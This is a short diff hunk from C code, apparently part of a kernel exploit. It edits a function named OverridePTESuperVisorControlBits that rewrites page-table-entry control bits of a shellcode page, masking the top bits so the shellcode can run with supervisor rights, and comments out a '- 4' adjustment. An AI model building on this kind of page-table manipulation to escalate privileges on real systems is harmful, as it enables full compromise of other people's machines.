@@ -220,7 +220,7 @@ void OverridePTESuperVisorControlBits(void *shellcodePTEBitsPtr, unsigned long l
 {
     unsigned long long shellcodePTEControlBitsKernel = 0;
 
-    shellcodePTEControlBitsKernel = (*((unsigned long long*) shellcodePTEBitsPtr)) - 4;
+    shellcodePTEControlBitsKernel = (*((unsigned long long*) shellcodePTEBitsPtr)); //- 4;
 
     shellcodePTEControlBitsKernel &= 0x0FFFFFFFFFFFFFFF;
 
